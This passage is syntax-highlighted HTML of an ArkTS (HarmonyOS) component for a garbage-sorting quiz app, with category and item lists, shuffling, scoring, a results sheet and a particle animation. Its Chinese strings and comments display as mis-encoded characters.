class="attr">itemOpacity</span>: number = <span class="number">1.0</span>; <span class="comment">// ç‰©å“é€æ˜åº¦</span></span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–åƒåœ¾ç±»åˆ«æ•°ç»„</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">garbageCategories</span>: <span class="title class_">GarbageCategory</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;æœ‰å®³åƒåœ¾&quot;</span>, <span class="number">0</span>, <span class="string">&quot;#e2413f&quot;</span>, <span class="string">&quot;å¯¹äººä½“å¥åº·æˆ–è‡ªç„¶ç¯å¢ƒå¯èƒ½é€ æˆç›´æ¥æˆ–æ½œåœ¨å±å®³çš„ç”Ÿæ´»åƒåœ¾&quot;</span>), <span class="comment">// åˆ›å»ºæœ‰å®³åƒåœ¾ç±»åˆ«</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;å¯å›æ”¶ç‰©&quot;</span>, <span class="number">1</span>, <span class="string">&quot;#1c6bb5&quot;</span>, <span class="string">&quot;é€‚å®œå›æ”¶å’Œèµ„æºåˆ©ç”¨çš„ç‰©å“&quot;</span>), <span class="comment">// åˆ›å»ºå¯å›æ”¶ç‰©ç±»åˆ«</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;å¨ä½™åƒåœ¾&quot;</span>, <span class="number">2</span>, <span class="string">&quot;#4ca84e&quot;</span>, <span class="string">&quot;ä¸Šæµ·ç§°æ¹¿åƒåœ¾ï¼Œæ˜“è…çƒ‚çš„ã€å«æœ‰æœºè´¨çš„ç”Ÿæ´»åƒåœ¾&quot;</span>), <span class="comment">// åˆ›å»ºå¨ä½™åƒåœ¾ç±»åˆ«</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;å…¶ä»–åƒåœ¾&quot;</span>, <span class="number">3</span>, <span class="string">&quot;#5f5f5f&quot;</span>, <span class="string">&quot;ä¸Šæµ·ç§°å¹²åƒåœ¾ï¼Œä¸èƒ½å½’ç±»äºä»¥ä¸Šä¸‰ç±»çš„ç”Ÿæ´»åƒåœ¾&quot;</span>), <span class="comment">// åˆ›å»ºå…¶ä»–åƒåœ¾ç±»åˆ«</span></span><br><span class="line">  ];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">garbageItems</span>: <span class="title class_">GarbageItem</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;èœå¸®èœå¶&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;å‰©èœå‰©é¥­&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;è¿‡æœŸé£Ÿå“&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;ç“œæœçš®å£³&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é±¼éª¨é±¼åˆº&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é¸¡è›‹åŠè›‹å£³&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ®‹æè½å¶&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;èŒ¶å¶æ¸£&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é…’ç“¶&quot;</span>, <span class="number">1</span>,),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;ç»ç’ƒæ¯&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;è°ƒå‘³ç“¶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;å›¾ä¹¦&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ‰“å°çº¸&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;ä¿¡å°&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ˜“æ‹‰ç½&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é‡‘å±åˆ€å…·&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;å¥¶ç²‰æ¡¶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;è¡£æœè£¤å­&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ¯›ç»’ç©å…·&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é‹&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é¥®æ–™ç“¶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;å¡‘æ–™ç›†&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é£Ÿç”¨æ²¹æ¡¶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ´—è¡£æœº&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;ç”µçƒ¤ç®±&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;ç”µè§†æœº&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;å……ç”µç”µæ± &quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;åºŸå«æ±è§å…‰ç¯ç®¡&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;è¿‡æœŸè¯å“åŠå…¶åŒ…è£…ç‰©&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ²¹æ¼†æ¡¶&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;è¡€å‹è®¡&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;åºŸæ°´é“¶æ¸©åº¦è®¡&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ€è™«å–·é›¾ç½&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;åºŸXå…‰ç‰‡ç­‰æ„Ÿå…‰èƒ¶ç‰‡&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é£Ÿå“è¢‹&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;å¤§æ£’éª¨&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;åˆ›å¯è´´&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;æ±¡æŸå¡‘æ–™è¢‹&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;çƒŸå±&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é™¶ç“·ç¢ç‰‡&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;é¤å·¾çº¸&quot;</span>, <span class="number">3</span>, <span class="string">&quot;å•çº¸ã€å«ç”Ÿçº¸é‡æ°´å³æº¶ï¼Œä¸ç®—å¯å›æ”¶çš„â€œçº¸å¼ â€ï¼Œç±»ä¼¼çš„è¿˜æœ‰çƒŸç›’ç­‰ã€‚&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;å«ç”Ÿçº¸&quot;</span>, <span class="number">3</span>, <span class="string">&quot;å•çº¸ã€å«ç”Ÿçº¸é‡æ°´å³æº¶ï¼Œä¸ç®—å¯å›æ”¶çš„â€œçº¸å¼ â€ï¼Œç±»ä¼¼çš„è¿˜æœ‰çƒŸç›’ç­‰ã€‚&quot;</span>),</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åœ¨ç»„ä»¶å³å°†å‡ºç°æ—¶é‡ç½®æµ‹éªŒ</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resetQuiz</span>(); <span class="comment">// è°ƒç”¨é‡ç½®æµ‹éªŒæ–¹æ³•</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// é‡ç½®æµ‹éªŒçŠ¶æ€</span></span><br><span class="line">  <span class="title function_">resetQuiz</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">quizResults</span> = []; <span class="comment">// æ¸…ç©ºæµ‹éªŒç»“æœ</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">totalScore</span> = <span class="number">0</span>; <span class="comment">// æ¸…é›¶æ€»å¾—åˆ†</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span> = <span class="number">0</span>; <span class="comment">// é‡ç½®å½“å‰é¢˜ç›®ç´¢å¼•</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">shuffleItems</span>(); <span class="comment">// æ‰“ä¹±åƒåœ¾é¡¹ç›®é¡ºåº</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ‰“ä¹±åƒåœ¾é¡¹ç›®é¡ºåº</span></span><br><span class="line">  <span class="title function_">shuffleItems</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">garbageItems</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">      <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>)); <span class="comment">// éšæœºç´¢å¼•</span></span><br><span class="line">      <span class="keyword">let</span> temp = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i]; <span class="comment">// ä¸´æ—¶å­˜å‚¨</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i] = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j]; <span class="comment">// äº¤æ¢ä½ç½®</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j] = temp; <span class="comment">// äº¤æ¢ä½ç½®</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ£€æŸ¥ç”¨æˆ·é€‰æ‹©çš„ç­”æ¡ˆ</span></span><br><span class="line">  <span class="title function_">checkAnswer</span>(<span class="params">categoryType: number</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> currentItem = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[<span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span>]; <span class="comment">// è·å–å½“å‰åƒåœ¾é¡¹ç›®</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">quizResults</span>.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;currentItem.name&#125;</span>ï¼ˆ<span class="subst">$&#123;<span class="variable language_">this</span>.garbageCategories[categoryType].name&#125;</span>ï¼‰ã€<span class="subst">$&#123;currentItem.type === categoryType ? <span class="string">&quot;âœ”&quot;</span> : <span class="variable language_">this</span>.garbageCategories[currentItem.type].name&#125;</span>ã€‘`</span>); <span class="comment">// æ·»åŠ åˆ°æµ‹éªŒç»“æœä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (currentItem.<span class="property">type</span> === categoryType) &#123; <span class="comment">// å¦‚æœç­”æ¡ˆæ­£ç¡®</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">totalScore</span> += <span class="number">10</span>; <span class="comment">// åŠ ååˆ†</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span>++; <span class="comment">// è¿›å…¥ä¸‹ä¸€ä¸ªé¢˜ç›®</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span> &gt;= <span class="number">10</span>) &#123; <span class="comment">// å¦‚æœå®Œæˆäº†åä¸ªé¢˜ç›®</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">displayResults</span>(); <span class="comment">// æ˜¾ç¤ºç»“æœ</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">resetQuiz</span>(); <span class="comment">// é‡ç½®æµ‹éªŒ</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ˜¾ç¤ºæµ‹éªŒç»“æœ</span></span><br><span class="line">  <span class="title function_">displayResults</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">sheets</span>: <span class="title class_">SheetInfo</span>[] = []; <span class="comment">// åˆå§‹åŒ–ç»“æœé¡µé¢åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">quizResults</span>.<span class="property">length</span>; i++) &#123; <span class="comment">// å¾ªç¯æ·»åŠ æ¯ä¸€ä¸ªç»“æœ</span></span><br><span class="line">      sheets.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="variable language_">this</span>.<span class="property">quizResults</span>[i], <span class="comment">// è®¾ç½®æ ‡é¢˜ä¸ºæµ‹éªŒç»“æœ</span></span><br><span class="line">        <span class="attr">action</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">getUIContext</span>().<span class="title function_">showActionSheet</span>(&#123; <span class="comment">// æ˜¾ç¤ºç»“æœé¡µ</span></span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;æˆç»©å•&#x27;</span>, <span class="comment">// æ ‡é¢˜</span></span><br><span class="line">      <span class="attr">message</span>: <span class="string">`æ€»åˆ†æ•°:<span class="subst">$&#123;<span class="variable language_">this</span>.totalScore&#125;</span>`</span>, <span class="comment">// åˆ†æ•°ä¿¡æ¯</span></span><br><span class="line">      <span class="attr">confirm</span>: &#123; <span class="comment">// ç¡®è®¤æŒ‰é’®</span></span><br><span class="line">        <span class="attr">defaultFocus</span>: <span class="literal">true</span>, <span class="comment">// é»˜è®¤ç„¦ç‚¹</span></span><br><span class="line">        <span class="attr">value</span>: <span class="string">&#x27;æˆ‘çŸ¥é“äº†&#x27;</span>, <span class="comment">// æŒ‰é’®æ–‡æœ¬</span></span><br><span class="line">        <span class="attr">action</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»åçš„åŠ¨ä½œ</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onWillDismiss</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// å…³é—­å‰çš„åŠ¨ä½œ</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">alignment</span>: <span class="title class_">DialogAlignment</span>.<span class="property">Center</span>, <span class="comment">// å¯¹é½æ–¹å¼ä¸ºä¸­å¿ƒ</span></span><br><span class="line">      <span class="attr">sheets</span>: sheets <span class="comment">// ç»“æœé¡µé¢åˆ—è¡¨</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// æ„å»ºç”¨æˆ·ç•Œé¢</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// åˆ›å»ºåˆ—å¸ƒå±€</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">`åƒåœ¾åˆ†ç±»æµ‹éªŒ:<span class="subst">$&#123;<span class="variable language_">this</span>.currentQuestionIndex + <span class="number">1</span>&#125;</span>/10`</span>) <span class="comment">// æ˜¾ç¤ºå½“å‰é¢˜ç›®åºå·</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="string">&#x27;30lpx&#x27;</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">        .<span class="title function_">margin</span>(<span class="number">20</span>); <span class="comment">// è®¾ç½®å¤–è¾¹è·</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºå †æ ˆå¸ƒå±€</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.garbageItems[<span class="variable language_">this</span>.currentQuestionIndex].name&#125;</span>`</span>) <span class="comment">// æ˜¾ç¤ºå½“å‰åƒåœ¾é¡¹ç›®åç§°</span></span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// å±…ä¸­å¯¹é½</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;130lpx&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;130lpx&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">border</span>(&#123; <span class="attr">width</span>: <span class="number">1</span> &#125;) <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’åŠå¾„</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="string">&#x27;20lpx&#x27;</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="number">2</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">          .<span class="title function_">scale</span>(<span class="variable language_">this</span>.<span class="property">scaleOptions</span>); <span class="comment">// è®¾ç½®ç¼©æ”¾æ¯”ä¾‹</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">showAnimation</span>) &#123; <span class="comment">// å¦‚æœæ˜¾ç¤ºåŠ¨ç”»</span></span><br><span class="line">          <span class="title class_">Particle</span>(&#123; <span class="comment">// åˆ›å»ºç²’å­æ•ˆæœ</span></span><br><span class="line">            <span class="attr">particles</span>: [ <span class="comment">// åˆå§‹åŒ–ç²’å­æ•°ç»„</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">emitter</span>: &#123; <span class="comment">// ç²’å­å‘å°„å™¨é…ç½®</span></span><br><span class="line">                  <span class="attr">particle</span>: &#123; <span class="comment">// ç²’å­ç±»å‹é…ç½®</span></span><br><span class="line">                    <span class="attr">type</span>: <span class="title class_">ParticleType</span>.<span class="property">POINT</span>, <span class="comment">// ç²’å­ç±»å‹ä¸ºç‚¹</span></span><br><span class="line">                    <span class="attr">config</span>: &#123; <span class="comment">// é…ç½®</span></span><br><span class="line">                      <span class="attr">radius</span>: <span class="number">5</span> <span class="comment">// ç‚¹çš„åŠå¾„</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">count</span>: <span class="number">50</span>, <span class="comment">// ç²’å­æ•°é‡</span></span><br><span class="line">                    <span class="attr">lifetime</span>: -<span class="number">1</span>, <span class="comment">// ç”Ÿå‘½å‘¨æœŸ</span></span><br><span class="line">                    <span class="attr">lifetimeRange</span>: -<span class="number">1</span> <span class="comment">// ç”Ÿå‘½å‘¨æœŸèŒƒå›´</span></span><br><span class="line">                  &#125;,</span><br><span class="line">                  <span class="attr">emitRate</span>: <span class="number">100</span>, <span class="comment">// å‘å°„é€Ÿç‡</span></span><br><span class="line">                  <span class="attr">position</span>: [<span class="string">&#x27;25%&#x27;</span>, <span class="number">0</span>], <span class="comment">// å‘å°„ä½ç½®</span></span><br><span class="line">                  <span class="attr">size</span>: [<span class="string">&#x27;100lpx&#x27;</span>, <span class="string">&#x27;100lpx&#x27;</span>], <span class="comment">// å‘å°„å™¨å¤§å°</span></span><br><span class="line">                  <span class="attr">shape</span>: <span class="title class_">ParticleEmitterShape</span>.<span class="property">RECTANGLE</span> <span class="comment">// å‘å°„å™¨å½¢çŠ¶ä¸ºçŸ©å½¢</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">color</span>: &#123; <span class="comment">// ç²’å­é¢œè‰²é…ç½®</span></span><br><span class="line">                  <span class="attr">range</span>: [<span class="title class_">Color</span>.<span class="property">Orange</span>, <span class="title class_">Color</span>.<span class="property">Orange</span>], <span class="comment">// é¢œè‰²èŒƒå›´</span></span><br><span class="line">                  <span class="attr">updater</span>: &#123; <span class="comment">// æ›´æ–°å™¨é…ç½®</span></span><br><span class="line">                    <span class="attr">type</span>: <span class="title class_">ParticleUpdater</span>.<span class="property">CURVE</span>, <span class="comment">// å˜åŒ–æ–¹å¼ä¸ºæ›²çº¿å˜åŒ–</span></span><br><span class="line">                    <span class="attr">config</span>: [ <span class="comment">// é…ç½®é¡¹</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="attr">from</span>: <span class="title class_">Color</span>.<span class="property">Orange</span>, <span class="comment">// èµ·å§‹é¢œè‰²</span></span><br><span class="line">                        <span class="attr">to</span>: <span class="title class_">Color</span>.<span class="property">Orange</span>, <span class="comment">// ç»ˆæ­¢é¢œè‰²</span></span><br><span class="line">                        <span class="attr">startMillis</span>: <span class="number">0</span>, <span class="comment">// å¼€å§‹æ—¶é—´</span></span><br><span class="line">                        <span class="attr">endMillis</span>: -<span class="number">1</span>, <span class="comment">// ç»“æŸæ—¶é—´</span></span><br><span class="line">                        <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">FastOutLinearIn</span> <span class="comment">// æ›²çº¿ç±»å‹</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    ]</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">scale</span>: &#123; <span class="comment">// ç²’å­å¤§å°é…ç½®</span></span><br><span class="line">                  <span class="attr">range</span>: [<span class="number">0.8</span>, <span class="number">1.2</span>], <span class="comment">// å¤§å°èŒƒå›´</span></span><br><span class="line">                  <span class="attr">updater</span>: &#123; <span class="comment">// æ›´æ–°å™¨é…ç½®</span></span><br><span class="line">                    <span class="attr">type</span>: <span class="title class_">ParticleUpdater</span>.<span class="property">CURVE</span>, <span class="comment">// å˜åŒ–æ–¹å¼ä¸ºæ›²çº¿å˜åŒ–</span></span><br><span class="line">                    <span class="attr">config</span>: [ <span class="comment">// é…ç½®é¡¹</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="attr">from</span>: <span class="number">1.0</span>, <span class="comment">// èµ·å§‹å¤§å°</span></span><br><span class="line">                        <span class="attr">to</span>: <span class="number">1.0</span>, <span class="comment">// ç»ˆæ­¢å¤§å°</span></span><br><span class="line">                        <span class="attr">startMillis</span>: <span class="number">0</span>, <span class="comment">// å¼€å§‹æ—¶é—´</span></span><br><span class="line">                        <span class="attr">endMillis</span>: -<span class="number">1</span>, <span class="comment">// ç»“æŸæ—¶é—´</span></span><br><span class="line">                        <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseIn</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    ]</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ç²’å­åŠ é€Ÿåº¦é…ç½®</span></span><br><span class="line">                <span class="attr">acceleration</span>: &#123;</span><br><span class="line">                  <span class="attr">speed</span>: &#123;</span><br><span class="line">                    <span class="attr">range</span>: [<span class="number">8000</span>, <span class="number">10000</span>], <span class="comment">// å‘ä¸‹å‡é€Ÿï¼Œæ¨¡æ‹Ÿé‡åŠ›</span></span><br><span class="line">                    <span class="attr">updater</span>: &#123;</span><br><span class="line">                      <span class="attr">type</span>: <span class="title class_">ParticleUpdater</span>.<span class="property">RANDOM</span>, <span class="comment">// åŠ é€Ÿåº¦çº¿æ€§å˜åŒ–</span></span><br><span class="line">                      <span class="attr">config</span>: [<span class="number">400</span>, <span class="number">500</span>]</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  <span class="attr">angle</span>: &#123;</span><br><span class="line">                    <span class="attr">range</span>: [<span class="number">90</span>, <span class="number">90</span>] <span class="comment">// æ–¹å‘å›ºå®šå‘ä¸‹</span></span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,</span><br><span class="line"></span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&quot;100%&quot;</span>).<span class="title function_">height</span>(<span class="string">&quot;100%&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;150lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">height</span>(<span class="string">&#x27;300lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>)</span><br><span class="line">      .<span class="title function_">translate</span>(&#123;<span class="attr">x</span>:<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.itemXPosition&#125;</span>lpx`</span>,<span class="attr">y</span>:<span class="number">0</span>&#125;);</span><br><span class="line"></span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">garbageCategories</span>, <span class="function">(<span class="params">category: GarbageCategory</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Text</span>(category.<span class="property">name</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="string">&#x27;30lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">padding</span>(<span class="number">5</span>);</span><br><span class="line">            <span class="title class_">Divider</span>();</span><br><span class="line">            <span class="title class_">Text</span>(category.<span class="property">description</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="string">&#x27;28lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">padding</span>(<span class="number">5</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(category.<span class="property">color</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;280lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&quot;24%&quot;</span>)</span><br><span class="line">          .<span class="title function_">border</span>(&#123; <span class="attr">width</span>: <span class="number">1</span> &#125;)</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span 